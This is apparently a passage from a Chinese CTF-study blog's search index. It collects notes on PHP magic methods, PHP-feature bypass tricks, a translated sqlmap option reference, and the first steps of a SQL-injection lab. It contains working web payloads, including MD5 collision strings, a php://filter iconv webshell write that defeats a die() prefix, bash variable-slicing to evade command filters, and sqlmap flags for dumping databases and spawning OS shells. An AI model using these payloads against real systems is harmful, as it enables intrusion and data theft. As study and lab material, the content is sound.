\n","categories":["php反序列化"],"tags":["web","php伪协议","php"]},{"title":"php反序列化","url":"/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/","content":"__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，用静态方式中调用一个不可访问方法时调用__get()，获得一个类的成员变量时调用__set()，设置一个类的成员变量时调用__isset()，当对不可访问属性调用isset()或empty()时调用__unset()，当对不可访问属性调用unset()时被调用。__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，调用函数的方式调用一个对象时的回应方法__set_state()，调用var_export()导出类时，此静态方法会被调用。__clone()，当对象复制完成时调用__autoload()，尝试加载未定义的类__debugInfo()，打印所需调试信息","categories":["php反序列化"],"tags":["web","php"]},{"title":"php特性","url":"/2025/03/04/web/php%E7%89%B9%E6%80%A7/%E5%A5%87%E5%A5%87%E5%A6%99%E5%A6%99%E7%9A%84%E7%89%B9%E6%80%A7/","content":"1、数组绕过正则表达式if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;else(intval($num))&#123;        echo $flag;    &#125;\npreg_match第二个参数要求是字符串，如果传入数组则不会进入if语句\npayload:num[]&#x3D;1\n2、intval函数的使用intval( mixed $value, int $base &#x3D; 10) : int如果 base 是 0，通过检测 value 的格式来决定使用的进制：◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，◦ 将使用 10 进制 (decimal)。\nif($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;\n科学计数法也可以绕过\nintval(‘4476.0’)&#x3D;&#x3D;&#x3D;4476    小数点intval(‘+4476.0’)&#x3D;&#x3D;&#x3D;4476   正负号intval(‘4476e0’)&#x3D;&#x3D;&#x3D;4476    科学计数法intval(‘0x117c’)&#x3D;&#x3D;&#x3D;4476    16进制intval(‘010574’)&#x3D;&#x3D;&#x3D;4476    8进制intval(‘ 010574’)&#x3D;&#x3D;&#x3D;4476   8进制+空格payload:num&#x3D;4476.0\n这里补充一下\n&lt;?phpecho intval(42);                      // 42echo intval(4.2);                     // 4echo intval(&#x27;42&#x27;);                    // 42echo intval(&#x27;+42&#x27;);                   // 42echo intval(&#x27;-42&#x27;);                   // -42echo intval(042);                     // 34echo intval(&#x27;042&#x27;);                   // 42echo intval(1e10);                    // 10000000000echo intval(&#x27;1e10&#x27;);                  // 10000000000echo intval(0x1A);                    // 26echo intval(42000000);                // 42000000echo intval(420000000000000000000);   // 0echo intval(&#x27;420000000000000000000&#x27;); // 2147483647echo intval(42, 8);                   // 42echo intval(&#x27;42&#x27;, 8);                 // 34echo intval(array());                 // 0echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1?&gt;\n\n3、正则表达式修饰符if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;nonononono&#x27;;&#125;\n\ni 不区分(ignore)大小写；m多(more)行匹配，若有换行符则以换行符分割，按行匹配\npayload:%0aphp,第一行匹配换行后有php故通过，第二个不符合php开头php结尾故不通过\n4、highlight_file路径highlight_file的参数可以是路径的\nif($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;\nif语句只比对字符串，highlight_file可以写路径，故payload有多种解法：\n&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php              绝对路径.&#x2F;flag.php                          相对路径php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php      php伪协议\n5、md5比较缺陷PHP中hash比较是存在缺陷的，MD5无法处理数组，如果传入数组则返回NULL，两个NULL是强相等的\nif ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])&#123;    if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;        echo $flag;    &#125;else&#123;    print &#x27;Wrong.&#x27;;    &#125;&#125;\n不同数据强相等\npayload:a[]&#x3D;1&amp;b[]&#x3D;2\nmd5弱比较，使用了强制类型转换后不再接收数组\n$a=(string)$a;$b=(string)$b;if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;echo $flag;&#125;\nmd5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。\n不同数据弱相等\npayload: a&#x3D;QNKCDZO&amp;b&#x3D;240610708\nMD5等于自身，如md5($a)&#x3D;&#x3D;$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017\nmd5强碰撞\n$a=(string)$a;$b=(string)$b;if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;echo $flag;&#125;\n\n这时候需要找到两个真正的md5值相同数据\na&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n6、三目运算符的理解+变量覆盖$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);\n\n太经典了，我晕了\n第一行，GET被设置，就可以用POST覆盖GET的值。中间两行意义不大，是flag就被COOKIE覆盖，然后被SERVER覆盖，不是flag被赋值flag然后条件成立也是被SERVER覆盖。而且这个被覆盖的GET没有指定，任意都行，第四行才是关键，等于flag就输出flag，不等于显示源码。所以只需要传入一个任意的GET保证$_GET是被设置的。然后POST一个覆盖它\npayload:get：1&#x3D;1 post：HTTP_FLAG&#x3D;flag\n7、php弱类型比较经典\n$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;\n\n弱比较字符串1.php与1返回true。array_push这个函数往里填数字1，则是int类型，in_array使用的就是&#x3D;&#x3D;弱比较。所以，如果数组里有数字1，与字符串1.php比较时是返回true的。注意，$array( 1 , ‘2’ , ‘3’ )，这里1是int型，2和3都是string类型。\n这道题，每次生成随机数都包含1，所以1在数组中的可能最大。\npayload:n&#x3D;1.php post:content&#x3D;多试几次，然后蚁剑直接连\n8、and与&amp;&amp;的区别&lt;?php$a=true and false and false;var_dump($a);  返回true$a=true &amp;&amp; false &amp;&amp; false;var_dump($a);  返回false\n9、反射类ReflectionClass反射类还不太懂，但做过题都是直接输出这个类echo new ReflectionClass(‘类名’);\n10、is_numeric与hex2bin​ is_numeric在PHP5中是可以识别十六进制的，hex2bin参数不能带0x\n11、sha1比较缺陷sha1无法处理数组，如下可使用a[]&#x3D;1&amp;b[]&#x3D;1数组绕过\nif($a==$b)&#123;    if(sha1($a)==sha1($b))&#123;        echo $flag;    &#125;&#125;\n但MD5或者sha1这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如\naaroZmOkaaK1STfYaaO8zKZFaa3OFF9m\n12、PHP双$（$$）的变量覆盖在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名\n$test=&quot;a23&quot;;    $test等于a23$$test=456;        $$test也就等于$23,这里相当于给$a23赋值了echo $test;        正常输出$test为a23echo $$test;    这里输出$$test，就是$a23，为456echo $a23;        第二行给$a23赋值了，这里正常输出\n13、parse_str函数的使用parse_str会把字符串解析为变量，大部分是传入的多个值\n$a=&quot;q=123&amp;p=456&quot;;parse_str($a);echo $q;                输出123echo $p;                输出456parse_str($a,$b);        第二个参数作为数组，解析的变量都存入这个数组中echo $b[&#x27;q&#x27;];            输出123echo $b[&#x27;p&#x27;];            输出456\nphp8版本必须要有第二个参数，php7不影响使用但会警告一下\n14、ereg %00正则截断ereg PHP5.3废弃了，功能可以由preg_match代替，ereg有个截断漏洞，字符串里包括%00就只匹配%00之前的内容。所以可以前面根据正则改，后面是执行语句，如果有strrev() 这种字符串反转函数配合用更好。\n15、迭代器获取当前目录FilesystemIterator可以获得文件目录，参数需要 . 或者具体路径，getcwd()这个函数可以获取当前文件路径，二者在一定条件下配合使用较好\n16、$GLOBALS全局变量的使用$GLOBALS — 引用全局作用域中可用的全部变量一个包含了全部变量的全局组合数组。变量的名字就是数组的键。\n构造出var_dump($GLOBALS);可以输出全部变量值，包括自定义\n17、php伪协议绕过is_file highlight_file对于php伪协议的使用is_file判断给定文件名是否为一个正常的文件，返回值为布尔类型。is_file会认为php伪协议不是文件。但highlight_file认为伪协议可以是文件。\nif(! is_file($file))&#123;    highlight_file($file);&#125;else&#123;    echo &quot;hacker!&quot;;&#125;\n如上的代码，可以传入php伪协议进行绕过并且显示含有flag的文件。若有过滤，可以换其他伪协议或改编码方式\n18、多写根目录绕过is_file在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容多次重复后绕过is_file的具体原理尚不清楚。如上面的代码，也可以用下面payload代替\nfile&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php这个按理说也是文件的，但is_file认为不是\n19、trim函数的绕过+is_numeric绕过这两个函数一起检测时，is_numeric认为内容里有%09 %0a %0b %0c %0d %20也算数字，跟trim一起测试一下\nfor ($i=0; $i &lt;=128 ; $i++) &#123;     $x=chr($i).&#x27;1&#x27;;   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;        echo urlencode(chr($i)).&quot;\\n&quot;;   &#125;&#125;\n除了+-.号以外还有只剩下%0c也就是换页符了，trim默认时没有剔除%0c。形如以下代码可以绕过\nif(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;\npayload:num&#x3D;%0c36\n20、绕过死亡diefunction filter($x)&#123;    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);\n这道看了羽师傅wp，过滤了许多协议，这是取一个 UCS-2LE UCS-2BE\npayload:file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.phppost:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?这会将字符两位两位交换，file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌，可以执行\n21、通过内置bash命令构造命令在许多命令被过滤时，可以一个字母一个字母得构造，而这些字母从内置变量里面截，比如构造nl，可以写为下面这种方式\n${PATH:14:1}${PATH:5:1}\n在linux中可以用~获取变量的最后几位，也可以写为${PATH:~0}${PWD:~0}，字母与0作用一样，${PATH:~A}${PWD:~A}也是nl，flag.php也过滤了的话可以用????.???，具体情况，具体对待\n22、PHP变量名非法字符比如传入AA_BB.CC这个变量，PHP是不允许变量名中含有. 的，会默认将不合法字符替换为_,如下：\n&lt;?php var_dump($_POST);?&gt; \n\n传值：AA.BB.CC&#x3D;14输出：array(1) { [“AA_BB_CC”]&#x3D;&gt; string(2) “14” }但输入AA[BB.CC它就只替换 [ 输出 array(1) { [“AA_BB.CC”]&#x3D;&gt; string(2) “14” }\n23、gettext拓展的使用var_dump(call_user_func($f1,$f2));如以上代码，多重过滤后，f1可以为gettext，f2可以为phpinfo，如果过滤更为严格，更改ini文件里的拓展后， _() 等效于 gettext()\n&lt;?phpecho gettext(&quot;phpinfo&quot;);结果  phpinfoecho _(&quot;phpinfo&quot;);结果 phpinfo\n24、正则最大回溯次数绕过PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。\n也就是说前面100万个字母，后面是语句就好，如下面的例子\nif(preg_match(&#x27;/.+?ABC/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f, &#x27;ABC&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;\n前面100万个字母后面ABC就可以echo $flag\n25、调用类中的函数-&gt;用于动态语境处理某个类的某个实例::可以调用一个静态的、不依赖于其他初始化的类方法\n也就是说双冒号不用实例化类就可以调用类中的静态方法\nclass ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]);\n这个传入ctfshow&#x3D;ctfshow::getFlag即可\n26、return绕过eval(“return 1;phpinfo();”);会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。\n来源: Tajang的大千世界文章作者: Tajang文章链接: https://ctfking.com/2021/07/14/php-te-xing-zong-jie/ \n","categories":["php特性"],"tags":["web","php"]},{"title":"sqlmap","url":"/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","content":"转载自https://www.cnblogs.com/R3col/p/12452543.html \nsqlmap简介sqlmap支持五种不同的注入模式：基于布尔的盲注基于时间的盲注基于报错注入联合查询注入堆叠注入sqlmap支持九种不同的数据库：​ MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB\n常用语句自动检测\nsqlmap -u http:/xxxxxx.xxx -batch\n指定参数\nsqlmap -u http:/xxxxxx.xxx/?id=x&amp;param=x -p id\n指定数据库类型\nsqlmap -u http:/xxxxxx.xxx –dbms mysql\n从文件读取http请求报文\nsqlmap -r 1.txt -batch\n设置cookie\nsqlmap -u http:/xxxxxx.xxx --cookie=&quot;JSESSION=asd&quot;\n查询数据库\nsqlmap -u http:/xxxxxx.xxx --dbs\n查询表\nsqlmap -u http:/xxxxxx.xxx -D 数据库名 --tables\n查字段名\nsqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 --columns\n爆数据\nsqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 -C &quot;字段名1，字段名2&quot;--dump\n在数据库中搜索字段 &#x2F; 表 &#x2F; 数据库名\nsqlmap -u http:/xxxxxx.xxx --search -C/T/D admin,password\n写入文件\nsqlmap -u http://xxx.xxx -–file-dest &quot;要写入的文件在本地的路径&quot; –file-write &quot;目标路径&quot;\n调用shell\nsqlmap -u http://xxx.xxx --os-shell\n-tip: 是否跟随302跳转​ 当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，​ 当注入错误的时候，先报错再跳转的时候，不需要跟随302。​ 目的是要追踪到错误信息。\nsqlmap详细命令用法python sqlmap.py [选项]\n选项\n-h, --help            显示基本帮助信息并退出-hh                   显示高级帮助信息并退出--version             显示程序版本信息并退出-v VERBOSE            输出信息详细程度级别：0-6（默认为 1）\n目标​ 至少提供一个以下选项以指定目标\n-d DIRECT           直接连接数据库-u URL, --url=URL   目标 URL（例如：&quot;http://www.site.com/vuln.php?id=1&quot;）-l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址-m BULKFILE         从文本文件中获取批量目标-r REQUESTFILE      从文件中读取 HTTP 请求-g GOOGLEDORK       使用 Google dork 结果作为目标-c CONFIGFILE       从 INI 配置文件中加载选项\n请求​ 以下选项可以指定连接目标地址的方式\n--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）--data=DATA         使用 POST 发送数据串（例如：&quot;id=1&quot;）--param-del=PARA..  设置参数值分隔符（例如：&amp;）--cookie=COOKIE     指定 HTTP Cookie（例如：&quot;PHPSESSID=a8d127e..&quot;）--cookie-del=COO..  设置 cookie 分隔符（例如：;）--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件--drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数--user-agent=AGENT  指定 HTTP User-Agent--random-agent      使用随机的 HTTP User-Agent--host=HOST         指定 HTTP Host--referer=REFERER   指定 HTTP Referer-H HEADER, --hea..  设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）--headers=HEADERS   设置额外的 HTTP 头参数（例如：&quot;Accept-Language: fr\\nETag: 123&quot;）--auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）--auth-cred=AUTH..  HTTP 认证凭证（username:password）--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件--ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）--ignore-proxy      忽略系统默认代理设置--ignore-redirects  忽略重定向尝试--ignore-timeouts   忽略连接超时--proxy=PROXY       使用代理连接目标 URL--proxy-cred=PRO..  使用代理进行认证（username:password）--proxy-file=PRO..  从文件中加载代理列表--tor               使用 Tor 匿名网络--tor-port=TORPORT  设置 Tor 代理端口代替默认端口--tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））--check-tor         检查是否正确使用了 Tor--delay=DELAY       设置每个 HTTP 请求的延迟秒数--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）--retries=RETRIES   连接超时时重试次数（默认为 3）--randomize=RPARAM  随机更改给定的参数值--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：                    有些网站在你连续多次访问错误地址时会关闭会话连接，                    后面的“请求”小节有详细说明）--safe-post=SAFE..  使用 POST 方法发送合法的数据--safe-req=SAFER..  从文件中加载合法的 HTTP 请求--safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求--skip-urlencode    不对 payload 数据进行 URL 编码--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token--csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL--force-ssl         强制使用 SSL/HTTPS--hpp               使用 HTTP 参数污染攻击--eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）\n优化​ 以下选项用于优化 sqlmap 性能\n-o                  开启所有优化开关--predict-output    预测常用请求的输出--keep-alive        使用持久的 HTTP(S) 连接--null-connection   仅获取页面大小而非实际的 HTTP 响应--threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）\n注入​ 以下选项用于指定要测试的参数，​ 提供自定义注入 payloads 和篡改参数的脚本\n-p TESTPARAMETER    指定需要测试的参数--skip=SKIP         指定要跳过的参数--skip-static       指定跳过非动态参数--param-exclude=..  用正则表达式排除参数（例如：&quot;ses&quot;）--dbms=DBMS         指定后端 DBMS（Database Management System，                    数据库管理系统）类型（例如：MySQL）--dbms-cred=DBMS..  DBMS 认证凭据（username:password）--os=OS             指定后端 DBMS 的操作系统类型--invalid-bignum    将无效值设置为大数--invalid-logical   对无效值使用逻辑运算--invalid-string    对无效值使用随机字符串--no-cast           关闭 payload 构造机制--no-escape         关闭字符串转义机制--prefix=PREFIX     注入 payload 的前缀字符串--suffix=SUFFIX     注入 payload 的后缀字符串--tamper=TAMPER     用给定脚本修改注入数据\n检测​ 以下选项用于自定义检测方式\n--level=LEVEL       设置测试等级（1-5，默认为 1）--risk=RISK         设置测试风险等级（1-3，默认为 1）--string=STRING     用于确定查询结果为真时的字符串--not-string=NOT..  用于确定查询结果为假时的字符串--regexp=REGEXP     用于确定查询结果为真时的正则表达式--code=CODE         用于确定查询结果为真时的 HTTP 状态码--text-only         只根据页面文本内容对比页面--titles            只根据页面标题对比页面\n技术​ 以下选项用于调整特定 SQL 注入技术的测试方法\n--technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：                    B: Boolean-based blind SQL injection（布尔型盲注）                    E: Error-based SQL injection（报错型注入）                    U: UNION query SQL injection（联合查询注入）                    S: Stacked queries SQL injection（堆叠查询注入）                    T: Time-based blind SQL injection（时间型盲注）                    Q: inline Query injection（内联查询注入）--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）--union-cols=UCOLS  设置联合查询注入测试的列数目范围--union-char=UCHAR  用于暴力猜解列数的字符--union-from=UFROM  设置联合查询注入 FROM 处用到的表--dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：                    推荐阅读《在SQL注入中使用DNS获取数据》                    http://cb.drops.wiki/drops/tips-5283.html，                    在后面的“技术”小节中也有相应解释）--second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：                    该选项用于 SQL 二阶注入）--second-req=SEC..  从文件读取 HTTP 二阶请求\n指纹识别\n-f, --fingerprint   执行广泛的 DBMS 版本指纹识别\n枚举​ 以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据。​ 此外，还可以运行你输入的 SQL 语句\n-a, --all           获取所有信息、数据-b, --banner        获取 DBMS banner--current-user      获取 DBMS 当前用户--current-db        获取 DBMS 当前数据库--hostname          获取 DBMS 服务器的主机名--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）--users             枚举出 DBMS 所有用户--passwords         枚举出 DBMS 所有用户的密码哈希--privileges        枚举出 DBMS 所有用户特权级--roles             枚举出 DBMS 所有用户角色--dbs               枚举出 DBMS 所有数据库--tables            枚举出 DBMS 数据库中的所有表--columns           枚举出 DBMS 表中的所有列--schema            枚举出 DBMS 所有模式--count             获取数据表数目--dump              导出 DBMS 数据库表项--dump-all          导出所有 DBMS 数据库表项--search            搜索列，表和/或数据库名--comments          枚举数据时检查 DBMS 注释-D DB               指定要枚举的 DBMS 数据库-T TBL              指定要枚举的 DBMS 数据表-C COL              指定要枚举的 DBMS 数据列-X EXCLUDE          指定不枚举的 DBMS 标识符-U USER             指定枚举的 DBMS 用户--exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库--pivot-column=P..  指定主列--where=DUMPWHERE   在转储表时使用 WHERE 条件语句--start=LIMITSTART  指定要导出的数据表条目开始行数--stop=LIMITSTOP    指定要导出的数据表条目结束行数--first=FIRSTCHAR   指定获取返回查询结果的开始字符位--last=LASTCHAR     指定获取返回查询结果的结束字符位--sql-query=QUERY   指定要执行的 SQL 语句--sql-shell         调出交互式 SQL shell--sql-file=SQLFILE  执行文件中的 SQL 语句\n暴力破解​ 以下选项用于暴力破解测试\n--common-tables     检测常见的表名是否存在--common-columns    检测常用的列名是否存在\n用户自定义函数注入​ 以下选项用于创建用户自定义函数\n--udf-inject        注入用户自定义函数--shared-lib=SHLIB  共享库的本地路径\n访问文件系统​ 以下选项用于访问后端 DBMS 的底层文件系统\n--file-read=FILE..  读取后端 DBMS 文件系统中的文件--file-write=FIL..  写入到后端 DBMS 文件系统中的文件--file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件\n访问操作系统​ 以下选项用于访问后端 DBMS 的底层操作系统\n--os-cmd=OSCMD      执行操作系统命令--os-shell          调出交互式操作系统 shell--os-pwn            调出 OOB shell，Meterpreter 或 VNC--os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC--os-bof            利用存储过程的缓冲区溢出--priv-esc          数据库进程用户提权--msf-path=MSFPATH  Metasploit 框架的本地安装路径--tmp-path=TMPPATH  远程临时文件目录的绝对路径\n访问 Windows 注册表：​ 以下选项用于访问后端 DBMS 的 Windows 注册表\n--reg-read          读取一个 Windows 注册表键值--reg-add           写入一个 Windows 注册表键值数据--reg-del           删除一个 Windows 注册表键值--reg-key=REGKEY    指定 Windows 注册表键--reg-value=REGVAL  指定 Windows 注册表键值--reg-data=REGDATA  指定 Windows 注册表键值数据--reg-type=REGTYPE  指定 Windows 注册表键值类型\n通用选项：​ 以下选项用于设置通用的参数\n-s SESSIONFILE      从文件（.sqlite）中读入会话信息-t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件--batch             从不询问用户输入，使用默认配置--binary-fields=..  具有二进制值的结果字段（例如：&quot;digest&quot;）--check-internet    在访问目标之前检查是否正常连接互联网--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站--crawl-exclude=..  用正则表达式筛选爬取的页面（例如：&quot;logout&quot;）--csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）--charset=CHARSET   指定 SQL 盲注字符集（例如：&quot;0123456789abcdef&quot;）--dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）--encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）--eta               显示每个结果输出的预计到达时间--flush-session     清空当前目标的会话文件--forms             解析并测试目标 URL 的表单--fresh-queries     忽略存储在会话文件中的查询结果--har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中--hex               获取数据时使用 hex 转换--output-dir=OUT..  自定义输出目录路径--parse-errors      从响应中解析并显示 DBMS 错误信息--preprocess=PRE..  使用给定脚本预处理响应数据--repair            重新导出具有未知字符的数据（?）--save=SAVECONFIG   将选项设置保存到一个 INI 配置文件--scope=SCOPE       用正则表达式从提供的代理日志中过滤目标--test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试--test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试--update            更新 sqlmap\n杂项\n-z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）--alert=ALERT       在找到 SQL 注入时运行 OS 命令--answers=ANSWERS   设置预定义回答（例如：“quit=N,follow=N”）--beep              出现问题提醒或在发现 SQL 注入时发出提示音--cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表--dependencies      检查 sqlmap 缺少（可选）的依赖--disable-coloring  关闭彩色控制台输出--gpage=GOOGLEPAGE  指定页码使用 Google dork 结果--identify-waf      针对 WAF/IPS 防护进行彻底的测试--mobile            使用 HTTP User-Agent 模仿智能手机--offline           在离线模式下工作（仅使用会话数据）--purge             安全删除 sqlmap data 目录所有内容--skip-waf          跳过启发式检测 WAF/IPS 防护--smart             只有在使用启发式检测时才进行彻底的测试--sqlmap-shell      调出交互式 sqlmap shell--tmp-dir=TMPDIR    指定用于存储临时文件的本地目录--web-root=WEBROOT  指定 Web 服务器根目录（例如：&quot;/var/www&quot;）--wizard            适合初级用户的向导界面","categories":["sql注入学习"],"tags":["web","sql注入"]},{"title":"sql注入一般步骤","url":"/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/","content":"sql注入一般步骤：第一步：通过特殊的数据库查询语句第二步：在数据库的错误返回中找到sql漏洞第三步:利用sql语句猜解管理人员信息并登录管理员后台\n基础语法(待补充)version():查看数据库版本\ndatabase():查看使用的数据库\nuser():查看当前用户\nlimit:limit子句分批来获取所有数据\ngroup_concat():一次性获取所有的数据库信息\ninformation_schema.tables:包含了数据库里所有的表\ntable_name:表名\ntable_schema:数据库名\ncolumn_name:字段名\n","categories":["sql注入学习","sql注入"],"tags":["web"]},{"title":"sql靶场第一题思路","url":"/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/study1/","content":"判断注入类型\nurl为 http://127.0.0.1?/id=1  and 1&#x3D;1时，没有报错\n\nurl为 http://127.0.0.1/?id=1  and 1&#x3D;2时，没有报错\n\nurl为 http://127.0.0.1/?id=1 ‘ 时,报错说明是字符型注入\n\n\n后台查询列数使用order by试出数据库列数\nurl为 http://127.0.0.1/?id=1 ‘ order by 数字–+ （如果试4时有错误，3时正确，那么列数为3）\n找显示位使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写\nurl为 